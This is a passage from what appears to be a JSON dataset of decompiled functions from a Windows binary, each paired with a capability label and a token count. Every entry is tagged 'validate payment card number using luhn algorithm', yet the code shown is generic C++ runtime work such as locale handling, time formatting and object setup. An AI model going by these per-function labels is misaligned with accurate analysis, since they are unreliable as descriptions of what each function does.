        "decompiled_code": "\nvoid fcn.1400208d0(ulong *arg1, ulong arg2, ulong arg3, ulong arg4)\n\n{\n    ulong uVar1;\n    char cVar2;\n    \n    fcn.14008db70(arg1);\n    *arg1 = 0x140116160;\n    fcn.140082180(arg1 + 10, arg2);\n    cVar2 = fcn.140027090(arg1 + 10);\n    if (cVar2 == '\\0') {\n        return;\n    }\n    *(arg1 + 0xc) = arg3;\n    arg1[0xf] = arg4;\n    fcn.14008bd30(arg1);\n    uVar1 = arg1[0xe];\n    arg1[6] = 0;\n    *(arg1 + 0x81) = 0;\n    arg1[3] = uVar1;\n    arg1[1] = uVar1;\n    arg1[2] = uVar1;\n    *(arg1 + 4) = 0x0;\n    return;\n}\n",
        "token_count": 235
    },
    "140021df": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.140021df0(void)\n\n{\n    ulong *arg1;\n    \n    arg1 = fcn.1400bc7f0(8);\n    *arg1 = 0x140116340;\n    fcn.1400bcdb0(arg1, 0x140111900, 0x140021a60);\n    if (*0x140106bb8 != 0) {\n        fcn.14001e510();\n        *0x140106bb8 = 0;\n    }\n    return;\n}\n",
        "token_count": 115
    },
    "140021f2": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.140021f20(ulong arg1, ulong arg2, ulong arg3, ulong *arg4)\n\n{\n    char cVar1;\n    \n    cVar1 = fcn.140072210(arg1, arg2);\n    if (cVar1 != '\\0') {\n        *arg4 = arg3;\n        arg4[2] = 0x10;\n        *(arg4 + 1) = 6;\n    }\n    return;\n}\n",
        "token_count": 101
    },
    "140024dd": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint64_t fcn.140024dd0(int64_t *arg1, ulong noname_1, uint64_t arg3)\n\n{\n    uint64_t uVar1;\n    \n    uVar1 = *(*arg1 + -0x18);\n    if (arg3 < uVar1) {\n        do {\n            if (*(*arg1 + arg3) != noname_1) {\n                return arg3;\n            }\n            arg3 = arg3 + 1;\n        } while (arg3 != uVar1);\n    }\n    return 0xffffffffffffffff;\n}\n",
        "token_count": 123
    },
    "1400269b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.1400269b0(int64_t arg1, uchar *arg2, ulong arg3, ulong arg4)\n\n{\n    ulong uVar1;\n    int64_t iVar2;\n    ulong uVar3;\n    ulong in_stack_00000028;\n    \n    uVar1 = sub.msvcrt.dll_setlocale(0, 0);\n    iVar2 = sub.msvcrt.dll_strlen(uVar1);\n    uVar3 = fcn.1400bc6e0(iVar2 + 1);\n    sub.msvcrt.dll_memcpy(uVar3, uVar1, iVar2 + 1);\n    sub.msvcrt.dll_setlocale(0, *(arg1 + 0x20));\n    iVar2 = sub.msvcrt.dll_strftime(arg2, arg3, arg4, in_stack_00000028);\n    sub.msvcrt.dll_setlocale(0, uVar3);\n    fcn.1400bc6b0(uVar3);\n    if (iVar2 == 0) {\n        *arg2 = 0;\n    }\n    return;\n}\n",
        "token_count": 233
    },
    "140026cd": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.140026cd0(int64_t arg1, ushort *arg2, ulong arg3, ulong arg4)\n\n{\n    ulong uVar1;\n    int64_t iVar2;\n    ulong uVar3;\n    ulong in_stack_00000028;\n    \n    uVar1 = sub.msvcrt.dll_setlocale(0, 0);\n    iVar2 = sub.msvcrt.dll_strlen(uVar1);\n    uVar3 = fcn.1400bc6e0(iVar2 + 1);\n    sub.msvcrt.dll_memcpy(uVar3, uVar1, iVar2 + 1);\n    sub.msvcrt.dll_setlocale(0, *(arg1 + 0x20));\n    iVar2 = sub.msvcrt.dll_wcsftime(arg2, arg3, arg4, in_stack_00000028);\n    sub.msvcrt.dll_setlocale(0, uVar3);\n    fcn.1400bc6b0(uVar3);\n    if (iVar2 == 0) {\n        *arg2 = 0;\n    }\n    return;\n}\n",
        "token_count": 233
    },
    "140026e8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint64_t fcn.140026e80(int64_t *arg1)\n\n{\n    int64_t *piVar1;\n    int64_t iVar2;\n    int64_t arg3;\n    ulong *arg1_00;\n    \n    arg3 = fcn.14002c080(0x1401089c0);\n    piVar1 = *(*arg1 + 0x18) + arg3 * 8;\n    iVar2 = *piVar1;\n    if (iVar2 != 0) {\n        return iVar2;\n    }\n    arg1_00 = fcn.1400bc710(0x90);\n    *(arg1_00 + 1) = 0;\n    *arg1_00 = 0x1401185e0;\n    arg1_00[2] = 0;\n    arg1_00[3] = 0;\n    *(arg1_00 + 4) = 0;\n    arg1_00[5] = 0;\n    arg1_00[6] = 0;\n    arg1_00[7] = 0;\n    arg1_00[8] = 0;\n    *(arg1_00 + 9) = 0;\n    *(arg1_00 + 0x11) = 0;\n    fcn.14009d830(arg1_00, arg1);\n    fcn.1400a38f0(*arg1, arg1_00, arg3);\n    return *piVar1;\n}\n",
        "token_count": 328
    },
    "140026f8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint64_t fcn.140026f80(int64_t *arg1)\n\n{\n    int64_t *piVar1;\n    int64_t iVar2;\n    int64_t arg3;\n    ulong *arg1_00;\n    \n    arg3 = fcn.14002c080(0x1401089d0);\n    piVar1 = *(*arg1 + 0x18) + arg3 * 8;\n    iVar2 = *piVar1;\n    if (iVar2 != 0) {\n        return iVar2;\n    }\n    arg1_00 = fcn.1400bc710(0xd0);\n    *(arg1_00 + 1) = 0;\n    *arg1_00 = 0x140118600;\n    arg1_00[2] = 0;\n    arg1_00[3] = 0;\n    *(arg1_00 + 4) = 0;\n    arg1_00[5] = 0;\n    arg1_00[6] = 0;\n    arg1_00[7] = 0;\n    arg1_00[8] = 0;\n    *(arg1_00 + 9) = 0;\n    *(arg1_00 + 0x19) = 0;\n    fcn.14009df10(arg1_00, arg1);\n    fcn.1400a38f0(*arg1, arg1_00, arg3);\n    return *piVar1;\n}\n",
        "token_count": 326
    },
    "14002ba2": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t fcn.14002ba20(int64_t *arg1, uint64_t arg2, ulong arg3)\n\n{\n    uint8_t uVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    \n    uVar3 = arg2;\n    uVar1 = *(arg1 + (arg2 & 0xff) + 0x139);\n    uVar2 = uVar1;\n    if (uVar1 == 0) {\n        if (*(*arg1 + 0x40) != 0x14002baf0) {\n            uVar3 = (**(*arg1 + 0x40))(arg1, arg2, arg3);\n        }\n        uVar2 = uVar3;\n        if (arg3 != uVar3) {\n            *(arg1 + (arg2 & 0xff) + 0x139) = uVar3;\n        }\n    }\n    return uVar2;\n}\n",
        "token_count": 209
    },
    "14002c08": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint64_t fcn.14002c080(uint64_t *arg1)\n\n{\n    uint64_t uVar1;\n    int32_t iVar2;\n    \n    uVar1 = *arg1;\n    if (uVar1 == 0) {\n        if (**0x14010fc90 != 0) {\n            LOCK();\n            iVar2 = *0x140108770 + 1;\n            LOCK();\n            *0x140108770 = *0x140108770 + 1;\n            *arg1 = *arg1 ^ (*arg1 == 0) * (*arg1 ^ iVar2);\n            return *arg1 - 1;\n        }\n        *0x140108770 = *0x140108770 + 1;\n        uVar1 = *0x140108770;\n        *arg1 = uVar1;\n    }\n    return uVar1 - 1;\n}\n",
        "token_count": 193
    },
    "14002c6e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nchar ** fcn.14002c6e0(char *arg1, int64_t arg2)\n\n{\n    int32_t *piVar1;\n    int64_t iVar2;\n    ulong *puVar3;\n    char **arg1_00;\n    char *pcVar4;\n    int64_t *piVar5;\n    ulong arg1_01;\n    \n    puVar3 = fcn.1400bce00(arg1, 0x140112140, 0x140112130, 0xfffffffffffffffe);\n    if (puVar3 == NULL) {\n        if (arg2 == *0x1401101b0) {\n            arg1_00 = fcn.1400bc710(0x28);\n            piVar5 = fcn.1400bc710(0x90);\n            *(piVar5 + 1) = 0;\n            iVar2 = *0x1401105a0;\n            piVar5[2] = 0;\n            piVar5[3] = 0;\n            *(piVar5 + 4) = '\\0';\n            *piVar5 = iVar2 + 0x10;\n            iVar2 = *0x140110730;\n            piVar5[5] = 0;\n            piVar5[6] = 0;\n            piVar5[7] = 0;\n            piVar5[8] = 0;\n            *(piVar5 + 9) = 0;\n            *(piVar5 + 0x11) = '\\0';\n            *(arg1_00 + 1) = 0;\n            *arg1_00 = iVar2 + 0x10;\n            arg1_00[2] = piVar5;\n            fcn.1400b3d40(arg1_00);\n            piVar1 = *0x14010fc90;\n            arg1_00[3] = arg1;\n            if (*piVar1 == 0) {\n                *(arg1 + 8) = *(arg1 + 8) + 1;\n            }\n            else {\n                LOCK();\n                *(arg1 + 8) = *(arg1 + 8) + 1;\n            }\n            arg1_00[4] = piVar5;\n            *arg1_00 = \"0S\\b@\\x01\";\n            fcn.140087770(0, arg1, piVar5);\n        }\n        else if (arg2 == *0x140110100) {\n            arg1_00 = fcn.1400bc710(0x20);\n            *(arg1_00 + 1) = 0;\n            *arg1_00 = *0x1401106c0 + 0x10;\n            pcVar4 = fcn.1400a5680();\n            arg1_00[2] = pcVar4;\n            piVar1 = *0x14010fc90;\n            arg1_00[3] = arg1;\n            if (*piVar1 == 0) {\n                *(arg1 + 8) = *(arg1 + 8) + 1;\n            }\n            else {\n                LOCK();\n                *(arg1 + 8) = *(arg1 + 8) + 1;\n            }\n            *arg1_00 = 0x140116370;\n        }\n        else if (arg2 == *0x1401101d0) {\n            arg1_00 = fcn.1400bc710(0x18);\n            *(arg1_00 + 1) = 0;\n            iVar2 = *0x140110750;\n            arg1_00[2] = arg1;\n            *arg1_00 = iVar2 + 0x10;\n            if (**0x14010fc90 == 0) {\n                *(arg1 + 8) = *(arg1 + 8) + 1;\n            }\n            else {\n                LOCK();\n                *(arg1 + 8) = *(arg1 + 8) + 1;\n            }\n            *arg1_00 = \"pV\\b@\\x01\";\n        }\n        else if (arg2 == *0x140110220) {\n            arg1_00 = fcn.1400bc710(0x18);\n            *(arg1_00 + 1) = 0;\n            iVar2 = *0x1401107c0;\n            arg1_00[2] = arg1;\n            *arg1_00 = iVar2 + 0x10;\n            if (**0x14010fc90 == 0) {\n                *(arg1 + 8) = *(arg1 + 8) + 1;\n            }\n            else {\n                LOCK();\n                *(arg1 + 8) = *(arg1 + 8) + 1;\n            }\n            *arg1_00 = 0x140116810;\n        }\n        else if (arg2 == *0x140110240) {\n            arg1_00 = fcn.1400bc710(0x18);\n            *(arg1_00 + 1) = 0;\n            iVar2 = *0x1401107e0;\n            arg1_00[2] = arg1;\n            *arg1_00 = iVar2 + 0x10;\n            if (**0x14010fc90 == 0) {\n                *(arg1 + 8) = *(arg1 + 8) + 1;\n            }\n            else {\n                LOCK();\n                *(arg1 + 8) = *(arg1 + 8) + 1;\n            }\n            *arg1_00 = \"p]\\b@\\x01\";\n        }\n        else if (arg2 == *0x14010fe10) {\n            arg1_00 = fcn.1400bc710(0x28);\n            piVar5 = fcn.1400bc710(0x70);\n            *(piVar5 + 1) = 0;\n            iVar2 = *0x140110600;\n            piVar5[2] = 0;\n            piVar5[3] = 0;\n            *(piVar5 + 4) = '\\0';\n            *piVar5 = iVar2 + 0x10;\n            iVar2 = *0x140110430;\n            *(piVar5 + 0x21) = 0;\n            piVar5[5] = 0;\n            piVar5[6] = 0;\n            piVar5[7] = 0;\n            piVar5[8] = 0;\n            piVar5[9] = 0;\n            piVar5[10] = 0;\n            *(piVar5 + 0xb) = 0;\n            *(piVar5 + 0x5c) = 0;\n            *(piVar5 + 0x6f) = '\\0';\n            *(arg1_00 + 1) = 0;\n            *arg1_00 = iVar2 + 0x10;\n            arg1_00[2] = piVar5;\n            fcn.14007ef90(arg1_00);\n            piVar1 = *0x14010fc90;\n            arg1_00[3] = arg1;\n            if (*piVar1 == 0) {\n                *(arg1 + 8) = *(arg1 + 8) + 1;\n            }\n            else {\n                LOCK();\n                *(arg1 + 8) = *(arg1 + 8) + 1;\n            }\n            arg1_00[4] = piVar5;\n            *arg1_00 = 0x140116a70;\n            fcn.1400884f0(0, arg1, piVar5);\n        }\n        else if (arg2 == *0x14010fe00) {\n            arg1_00 = fcn.1400bc710(0x28);\n            piVar5 = fcn.1400bc710(0x70);\n            *(piVar5 + 1) = 0;\n            iVar2 = *0x1401105f0;\n            piVar5[2] = 0;\n            piVar5[3] = 0;\n            *(piVar5 + 4) = '\\0';\n            *piVar5 = iVar2 + 0x10;\n            iVar2 = *0x140110420;\n            *(piVar5 + 0x21) = 0;\n            piVar5[5] = 0;\n            piVar5[6] = 0;\n            piVar5[7] = 0;\n            piVar5[8] = 0;\n            piVar5[9] = 0;\n            piVar5[10] = 0;\n            *(piVar5 + 0xb) = 0;\n            *(piVar5 + 0x5c) = 0;\n            *(piVar5 + 0x6f) = '\\0';\n            *(arg1_00 + 1) = 0;\n            *arg1_00 = iVar2 + 0x10;\n            arg1_00[2] = piVar5;\n            fcn.14007ebc0(arg1_00);\n            piVar1 = *0x14010fc90;\n            arg1_00[3] = arg1;\n            if (*piVar1 == 0) {\n                *(arg1 + 8) = *(arg1 + 8) + 1;\n            }\n            else {\n                LOCK();\n                *(arg1 + 8) = *(arg1 + 8) + 1;\n            }\n            arg1_00[4] = piVar5;\n            *arg1_00 = 0x140116990;\n            fcn.140088020(0, arg1, piVar5);\n        }\n        else if (arg2 == *0x140110190) {\n            arg1_00 = fcn.1400bc710(0x28);\n            fcn.1400b3a90(arg1_00, 0);\n            piVar1 = *0x14010fc90;\n            arg1_00[4] = arg1;\n            if (*piVar1 == 0) {\n                *(arg1 + 8) = *(arg1 + 8) + 1;\n            }\n            else {\n                LOCK();\n                *(arg1 + 8) = *(arg1 + 8) + 1;\n            }\n            *arg1_00 = 0x140116470;\n        }\n        else if (arg2 == *0x1401101c0) {\n            arg1_00 = fcn.1400bc710(0x28);\n            piVar5 = fcn.1400bc710(0xd0);\n            *(piVar5 + 1) = 0;\n            iVar2 = *0x1401105b0;\n            piVar5[2] = 0;\n            piVar5[3] = 0;\n            *(piVar5 + 4) = '\\0';\n            *piVar5 = iVar2 + 0x10;\n            iVar2 = *0x140110740;\n            piVar5[5] = 0;\n            piVar5[6] = 0;\n            piVar5[7] = 0;\n            piVar5[8] = 0;\n            *(piVar5 + 9) = 0;\n            *(piVar5 + 0x19) = '\\0';\n            *(arg1_00 + 1) = 0;\n            *arg1_00 = iVar2 + 0x10;\n            arg1_00[2] = piVar5;\n            fcn.1400b4100(arg1_00);\n            piVar1 = *0x14010fc90;\n            arg1_00[3] = arg1;\n            if (*piVar1 == 0) {\n                *(arg1 + 8) = *(arg1 + 8) + 1;\n            }\n            else {\n                LOCK();\n                *(arg1 + 8) = *(arg1 + 8) + 1;\n            }\n            arg1_00[4] = piVar5;\n            *arg1_00 = 0x140116610;\n            fcn.140087b80(0, arg1, piVar5);\n        }\n        else if (arg2 == *0x140110110) {\n            arg1_00 = fcn.1400bc710(0x20);\n            *(arg1_00 + 1) = 0;\n            *arg1_00 = *0x1401106d0 + 0x10;\n            pcVar4 = fcn.1400a5680();\n            arg1_00[2] = pcVar4;\n            piVar1 = *0x14010fc90;\n            arg1_00[3] = arg1;\n            if (*piVar1 == 0) {\n                *(arg1 + 8) = *(arg1 + 8) + 1;\n            }\n            else {\n                LOCK();\n                *(arg1 + 8) = *(arg1 + 8) + 1;\n            }\n            *arg1_00 = \"pN\\b@\\x01\";\n        }\n        else if (arg2 == *0x1401101e0) {\n            arg1_00 = fcn.1400bc710(0x18);\n            *(arg1_00 + 1) = 0;\n            iVar2 = *0x140110760;\n            arg1_00[2] = arg1;\n            *arg1_00 = iVar2 + 0x10;\n            if (**0x14010fc90 == 0) {\n                *(arg1 + 8) = *(arg1 + 8) + 1;\n            }\n            else {\n                LOCK();\n                *(arg1 + 8) = *(arg1 + 8) + 1;\n            }\n            *arg1_00 = \"0X\\b@\\x01\";\n        }\n        else if (arg2 == *0x140110230) {\n            arg1_00 = fcn.1400bc710(0x18);\n            *(arg1_00 + 1) = 0;\n            iVar2 = *0x1401107d0;\n            arg1_00[2] = arg1;\n            *arg1_00 = iVar2 + 0x10;\n            if (**0x14010fc90 == 0) {\n                *(arg1 + 8) = *(arg1 + 8) + 1;\n            }\n            else {\n                LOCK();\n                *(arg1 + 8) = *(arg1 + 8) + 1;\n            }\n            *arg1_00 = 0x140116870;\n        }\n        else if (arg2 == *0x140110250) {\n            arg1_00 = fcn.1400bc710(0x18);\n            *(arg1_00 + 1) = 0;\n            iVar2 = *0x1401107f0;\n            arg1_00[2] = arg1;\n            *arg1_00 = iVar2 + 0x10;\n            if (**0x14010fc90 == 0) {\n                *(arg1 + 8) = *(arg1 + 8) + 1;\n            }\n            else {\n                LOCK();\n                *(arg1 + 8) = *(arg1 + 8) + 1;\n            }\n            *arg1_00 = \"0_\\b@\\x01\";\n        }\n        else if (arg2 == *0x14010fe30) {\n            arg1_00 = fcn.1400bc710(0x28);\n            piVar5 = fcn.1400bc710(0x80);\n            *(piVar5 + 1) = 0;\n            iVar2 = *0x140110620;\n            piVar5[2] = 0;\n            piVar5[3] = 0;\n            *(piVar5 + 4) = '\\0';\n            *piVar5 = iVar2 + 0x10;\n            iVar2 = *0x140110450;\n            *(piVar5 + 0x22) = 0;\n            piVar5[5] = 0;\n            piVar5[6] = 0;\n            piVar5[7] = 0;\n            piVar5[8] = 0;\n            piVar5[9] = 0;\n            piVar5[10] = 0;\n            *(piVar5 + 0xb) = 0;\n            *(piVar5 + 0x5c) = 0;\n            *(piVar5 + 0x7a) = '\\0';\n            *(arg1_00 + 1) = 0;\n            *arg1_00 = iVar2 + 0x10;\n            arg1_00[2] = piVar5;\n            fcn.14007f740(arg1_00);\n            piVar1 = *0x14010fc90;\n            arg1_00[3] = arg1;\n            if (*piVar1 == 0) {\n                *(arg1 + 8) = *(arg1 + 8) + 1;\n            }\n            else {\n                LOCK();\n                *(arg1 + 8) = *(arg1 + 8) + 1;\n            }\n            arg1_00[4] = piVar5;\n            *arg1_00 = 0x140116c30;\n            fcn.140088ff0(0, arg1, piVar5);\n        }\n        else if (arg2 == *0x14010fe20) {\n            arg1_00 = fcn.1400bc710(0x28);\n            piVar5 = fcn.1400bc710(0x80);\n            *(piVar5 + 1) = 0;\n            iVar2 = *0x140110610;\n            piVar5[2] = 0;\n            piVar5[3] = 0;\n            *(piVar5 + 4) = '\\0';\n            *piVar5 = iVar2 + 0x10;\n            iVar2 = *0x140110440;\n            *(piVar5 + 0x22) = 0;\n            piVar5[5] = 0;\n            piVar5[6] = 0;\n            piVar5[7] = 0;\n            piVar5[8] = 0;\n            piVar5[9] = 0;\n            piVar5[10] = 0;\n            *(piVar5 + 0xb) = 0;\n            *(piVar5 + 0x5c) = 0;\n            *(piVar5 + 0x7a) = '\\0';\n            *(arg1_00 + 1) = 0;\n            *arg1_00 = iVar2 + 0x10;\n            arg1_00[2] = piVar5;\n            fcn.14007f360(arg1_00);\n            piVar1 = *0x14010fc90;\n            arg1_00[3] = arg1;\n            if (*piVar1 == 0) {\n                *(arg1 + 8) = *(arg1 + 8) + 1;\n            }\n            else {\n                LOCK();\n                *(arg1 + 8) = *(arg1 + 8) + 1;\n            }\n            arg1_00[4] = piVar5;\n            *arg1_00 = 0x140116b50;\n            fcn.140088a40(0, arg1, piVar5);\n        }\n        else {\n            if (arg2 != *0x1401101a0) {\n                arg1_01 = fcn.1400bd270(0x14010a978);\n                fcn.1400a5790(arg2);\n                do {\n                    fcn.1400bc6c0(arg2);\n                    arg1_01 = fcn.140014f30(arg1_01);\n                } while( true );\n            }\n            arg1_00 = fcn.1400bc710(0x28);\n            fcn.1400b3c60(arg1_00, 0);\n            piVar1 = *0x14010fc90;\n            arg1_00[4] = arg1;\n            if (*piVar1 == 0) {\n                *(arg1 + 8) = *(arg1 + 8) + 1;\n            }\n            else {\n                LOCK();\n                *(arg1 + 8) = *(arg1 + 8) + 1;\n            }\n            *arg1_00 = 0x1401164f0;\n        }\n    }\n    else {\n        arg1_00 = *puVar3;\n    }\n    return arg1_00;\n}\n",
        "token_count": 4543
    },
    "14002d1e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nchar ** fcn.14002d1e0(char *arg1, int64_t arg2)\n\n{\n    int32_t *piVar1;\n    int64_t iVar2;\n    ulong *puVar3;\n    char **arg1_00;\n    char *pcVar4;\n    int64_t *piVar5;\n    ulong arg1_01;\n    \n    puVar3 = fcn.1400bce00(arg1, 0x140112140, 0x140112130, 0xfffffffffffffffe);\n    if (puVar3 == NULL) {\n        if (arg2 == *0x140110020) {\n            arg1_00 = fcn.1400bc710(0x28);\n            piVar5 = fcn.1400bc710(0x90);\n            *(piVar5 + 1) = 0;\n            iVar2 = *0x1401105a0;\n            piVar5[2] = 0;\n            piVar5[3] = 0;\n            *(piVar5 + 4) = '\\0';\n            *piVar5 = iVar2 + 0x10;\n            iVar2 = *0x140110370;\n            piVar5[5] = 0;\n            piVar5[6] = 0;\n            piVar5[7] = 0;\n            piVar5[8] = 0;\n            *(piVar5 + 9) = 0;\n            *(piVar5 + 0x11) = '\\0';\n            *(arg1_00 + 1) = 0;\n            *arg1_00 = iVar2 + 0x10;\n            arg1_00[2] = piVar5;\n            fcn.1400b10e0(arg1_00);\n            piVar1 = *0x14010fc90;\n            arg1_00[3] = arg1;\n            if (*piVar1 == 0) {\n                *(arg1 + 8) = *(arg1 + 8) + 1;\n            }\n            else {\n                LOCK();\n                *(arg1 + 8) = *(arg1 + 8) + 1;\n            }\n            arg1_00[4] = piVar5;\n            *arg1_00 = 0x1401165c0;\n            fcn.140087550(0, arg1, piVar5);\n        }\n        else if (arg2 == *0x14010ffe0) {\n            arg1_00 = fcn.1400bc710(0x20);\n            *(arg1_00 + 1) = 0;\n            *arg1_00 = *0x140110350 + 0x10;\n            pcVar4 = fcn.1400a5680();\n            arg1_00[2] = pcVar4;\n            piVar1 = *0x14010fc90;\n            arg1_00[3] = arg1;\n            if (*piVar1 == 0) {\n                *(arg1 + 8) = *(arg1 + 8) + 1;\n            }\n            else {\n                LOCK();\n                *(arg1 + 8) = *(arg1 + 8) + 1;\n            }\n            *arg1_00 = 0x1401163b0;\n        }\n        else if (arg2 == *0x140110040) {\n            arg1_00 = fcn.1400bc710(0x18);\n            *(arg1_00 + 1) = 0;\n            iVar2 = *0x140110390;\n            arg1_00[2] = arg1;\n            *arg1_00 = iVar2 + 0x10;\n            if (**0x14010fc90 == 0) {\n                *(arg1 + 8) = *(arg1 + 8) + 1;\n            }\n            else {\n                LOCK();\n                *(arg1 + 8) = *(arg1 + 8) + 1;\n            }\n            *arg1_00 = 0x140116700;\n        }\n        else if (arg2 == *0x140110060) {\n            arg1_00 = fcn.1400bc710(0x18);\n            *(arg1_00 + 1) = 0;\n            iVar2 = *0x1401103b0;\n            arg1_00[2] = arg1;\n            *arg1_00 = iVar2 + 0x10;\n            if (**0x14010fc90 == 0) {\n                *(arg1 + 8) = *(arg1 + 8) + 1;\n            }\n            else {\n                LOCK();\n                *(arg1 + 8) = *(arg1 + 8) + 1;\n            }\n            *arg1_00 = \"`Z\\b@\\x01\";\n        }\n        else if (arg2 == *0x140110080) {\n            arg1_00 = fcn.1400bc710(0x18);\n            *(arg1_00 + 1) = 0;\n            iVar2 = *0x1401103d0;\n            arg1_00[2] = arg1;\n            *arg1_00 = iVar2 + 0x10;\n            if (**0x14010fc90 == 0) {\n                *(arg1 + 8) = *(arg1 + 8) + 1;\n            }\n            else {\n                LOCK();\n                *(arg1 + 8) = *(arg1 + 8) + 1;\n            }\n            *arg1_00 = 0x140116900;\n        }\n        else if (arg2 == *0x14010ffb0) {\n            arg1_00 = fcn.1400bc710(0x28);\n            piVar5 = fcn.1400bc710(0x70);\n            *(piVar5 + 1) = 0;\n            iVar2 = *0x140110600;\n            piVar5[2] = 0;\n            piVar5[3] = 0;\n            *(piVar5 + 4) = '\\0';\n            *piVar5 = iVar2 + 0x10;\n            iVar2 = *0x140110320;\n            *(piVar5 + 0x21) = 0;\n            piVar5[5] = 0;\n            piVar5[6] = 0;\n            piVar5[7] = 0;\n            piVar5[8] = 0;\n            piVar5[9] = 0;\n            piVar5[10] = 0;\n            *(piVar5 + 0xb) = 0;\n            *(piVar5 + 0x5c) = 0;\n            *(piVar5 + 0x6f) = '\\0';\n            *(arg1_00 + 1) = 0;\n            *arg1_00 = iVar2 + 0x10;\n            arg1_00[2] = piVar5;\n            fcn.1400a5fb0(arg1_00);\n            piVar1 = *0x14010fc90;\n            arg1_00[3] = arg1;\n            if (*piVar1 == 0) {\n                *(arg1 + 8) = *(arg1 + 8) + 1;\n            }\n            else {\n                LOCK();\n                *(arg1 + 8) = *(arg1 + 8) + 1;\n            }\n            arg1_00[4] = piVar5;\n            *arg1_00 = 0x140116ae0;\n            fcn.140088210(0, arg1, piVar5);\n        }\n        else if (arg2 == *0x14010ffa0) {\n            arg1_00 = fcn.1400bc710(0x28);\n            piVar5 = fcn.1400bc710(0x70);\n            *(piVar5 + 1) = 0;\n            iVar2 = *0x1401105f0;\n            piVar5[2] = 0;\n            piVar5[3] = 0;\n            *(piVar5 + 4) = '\\0';\n            *piVar5 = iVar2 + 0x10;\n            iVar2 = *0x140110310;\n            *(piVar5 + 0x21) = 0;\n            piVar5[5] = 0;\n            piVar5[6] = 0;\n            piVar5[7] = 0;\n            piVar5[8] = 0;\n            piVar5[9] = 0;\n            piVar5[10] = 0;\n            *(piVar5 + 0xb) = 0;\n            *(piVar5 + 0x5c) = 0;\n            *(piVar5 + 0x6f) = '\\0';\n            *(arg1_00 + 1) = 0;\n            *arg1_00 = iVar2 + 0x10;\n            arg1_00[2] = piVar5;\n            fcn.1400a5bf0(arg1_00);\n            piVar1 = *0x14010fc90;\n            arg1_00[3] = arg1;\n            if (*piVar1 == 0) {\n                *(arg1 + 8) = *(arg1 + 8) + 1;\n            }\n            else {\n                LOCK();\n                *(arg1 + 8) = *(arg1 + 8) + 1;\n            }\n            arg1_00[4] = piVar5;\n            *arg1_00 = 0x140116a00;\n            fcn.140087d40(0, arg1, piVar5);\n        }\n        else if (arg2 == *0x140110000) {\n            arg1_00 = fcn.1400bc710(0x28);\n            fcn.1400b0e30(arg1_00, 0);\n            piVar1 = *0x14010fc90;\n            arg1_00[4] = arg1;\n            if (*piVar1 == 0) {\n                *(arg1 + 8) = *(arg1 + 8) + 1;\n            }\n            else {\n                LOCK();\n                *(arg1 + 8) = *(arg1 + 8) + 1;\n            }\n            *arg1_00 = \"pP\\b@\\x01\";\n        }\n        else if (arg2 == *0x140110030) {\n            arg1_00 = fcn.1400bc710(0x28);\n            piVar5 = fcn.1400bc710(0xd0);\n            *(piVar5 + 1) = 0;\n            iVar2 = *0x1401105b0;\n            piVar5[2] = 0;\n            piVar5[3] = 0;\n            *(piVar5 + 4) = '\\0';\n            *piVar5 = iVar2 + 0x10;\n            iVar2 = *0x140110380;\n            piVar5[5] = 0;\n            piVar5[6] = 0;\n            piVar5[7] = 0;\n            piVar5[8] = 0;\n            *(piVar5 + 9) = 0;\n            *(piVar5 + 0x19) = '\\0';\n            *(arg1_00 + 1) = 0;\n            *arg1_00 = iVar2 + 0x10;\n            arg1_00[2] = piVar5;\n            fcn.1400b1490(arg1_00);\n            piVar1 = *0x14010fc90;\n            arg1_00[3] = arg1;\n            if (*piVar1 == 0) {\n                *(arg1 + 8) = *(arg1 + 8) + 1;\n            }\n            else {\n                LOCK();\n                *(arg1 + 8) = *(arg1 + 8) + 1;\n            }\n            arg1_00[4] = piVar5;\n            *arg1_00 = \"0U\\b@\\x01\";\n            fcn.1400878f0(0, arg1, piVar5);\n        }\n        else if (arg2 == *0x14010fff0) {\n            arg1_00 = fcn.1400bc710(0x20);\n            *(arg1_00 + 1) = 0;\n            *arg1_00 = *0x140110360 + 0x10;\n            pcVar4 = fcn.1400a5680();\n            arg1_00[2] = pcVar4;\n            piVar1 = *0x14010fc90;\n            arg1_00[3] = arg1;\n            if (*piVar1 == 0) {\n                *(arg1 + 8) = *(arg1 + 8) + 1;\n            }\n            else {\n                LOCK();\n                *(arg1 + 8) = *(arg1 + 8) + 1;\n            }\n            *arg1_00 = 0x140116430;\n        }\n        else if (arg2 == *0x140110050) {\n            arg1_00 = fcn.1400bc710(0x18);\n            *(arg1_00 + 1) = 0;\n            iVar2 = *0x1401103a0;\n            arg1_00[2] = arg1;\n            *arg1_00 = iVar2 + 0x10;\n            if (**0x14010fc90 == 0) {\n                *(arg1 + 8) = *(arg1 + 8) + 1;\n            }\n            else {\n                LOCK();\n                *(arg1 + 8) = *(arg1 + 8) + 1;\n            }\n            *arg1_00 = 0x1401167b0;\n        }\n        else if (arg2 == *0x140110070) {\n            arg1_00 = fcn.1400bc710(0x18);\n            *(arg1_00 + 1) = 0;\n            iVar2 = *0x1401103c0;\n            arg1_00[2] = arg1;\n            *arg1_00 = iVar2 + 0x10;\n            if (**0x14010fc90 == 0) {\n          